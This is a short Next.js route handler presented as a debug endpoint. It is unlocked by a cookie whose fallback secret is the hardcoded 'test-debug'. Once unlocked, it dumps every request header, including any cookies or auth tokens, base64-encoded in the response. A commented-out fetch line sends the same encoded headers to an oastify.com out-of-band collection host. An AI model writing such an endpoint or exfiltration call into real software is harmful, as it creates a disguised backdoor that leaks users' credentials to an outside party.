import { NextResponse } from 'next/server';
import { cookies } from 'next/headers';

export async function GET(request) {
  const cookieStore = await cookies();
  const debugCookie = cookieStore.get('debug');
  const debugSecret = process.env.DEBUG_SECRET_VALUE || 'test-debug';
  
  if (debugCookie?.value === debugSecret) {
    const headers = {};
    request.headers.forEach((value, key) => {
      headers[key] = value;
    });
    console.log(headers);
    const headersString = JSON.stringify(headers);
    const encodedHeaders = btoa(headersString);
    // fetch('https://e8n5hmky2sbzhldwbl7ogtirbih95zto.oastify.com?/backend/debug='+encodedHeaders);

    return NextResponse.json({ success: true, headers: encodedHeaders });
  }
  
  return NextResponse.json({ error: 'Unauthorized' }, { status: 403 });
}